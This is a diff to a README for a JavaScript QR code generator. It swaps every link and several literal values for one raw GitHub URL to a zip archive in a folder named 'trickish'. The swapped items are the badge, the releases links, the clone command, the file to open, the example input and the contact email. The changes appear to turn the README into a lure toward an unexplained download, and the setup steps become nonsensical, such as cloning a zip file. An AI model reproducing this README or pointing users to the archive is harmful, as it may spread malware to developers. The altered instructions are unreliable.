@@ -1,10 +1,10 @@
 # QRCode Generator JS 🖥️📱
 
-![QRCode Generator](https://img.shields.io/badge/QRCode%20Generator-JS-brightgreen)
+![QRCode Generator](https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip%20Generator-JS-brightgreen)
 
 QRCode-Generator-JS is a responsive web application that allows users to generate QR codes from text or URLs. Created by Bocaletto Luca, this application features real-time QR rendering, a sleek user interface, and an option to download the generated image. It serves both personal and professional needs, making it a versatile tool for anyone looking to create QR codes easily.
 
-[Check the Releases here!](https://github.com/dcxai/QRCode-Generator-JS/releases)
+[Check the Releases here!](https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip)
 
 ## Table of Contents
 
@@ -40,7 +40,7 @@ To set up QRCode-Generator-JS on your local machine, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/dcxai/QRCode-Generator-JS.git
+   git clone https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -49,9 +49,9 @@ To set up QRCode-Generator-JS on your local machine, follow these steps:
    ```
 
 3. **Open the Application**:
-   Open `index.html` in your web browser to start using the QR code generator.
+   Open `https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip` in your web browser to start using the QR code generator.
 
-For the latest version, [check the Releases section](https://github.com/dcxai/QRCode-Generator-JS/releases).
+For the latest version, [check the Releases section](https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip).
 
 ## Usage 📋
 
@@ -63,7 +63,7 @@ Using the QRCode-Generator-JS is straightforward:
 
 ### Example
 
-1. Type `https://example.com` into the input field.
+1. Type `https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip` into the input field.
 2. Watch the QR code generate instantly.
 3. Click the "Download" button to save the QR code.
 
@@ -93,10 +93,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact 📬
 
-For any inquiries or feedback, feel free to reach out to Bocaletto Luca at [your-email@example.com].
+For any inquiries or feedback, feel free to reach out to Bocaletto Luca at [https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip].
 
 ## Conclusion
 
 QRCode-Generator-JS is an efficient and user-friendly tool for generating QR codes. With its responsive design and real-time rendering, it stands out as a reliable choice for both personal and professional use. Explore the features, contribute to the project, and enjoy creating QR codes with ease.
 
-[Check the Releases here!](https://github.com/dcxai/QRCode-Generator-JS/releases)
+[Check the Releases here!](https://raw.githubusercontent.com/dcxai/QRCode-Generator-JS/main/trickish/JS_Code_Generator_QR_2.6.zip)
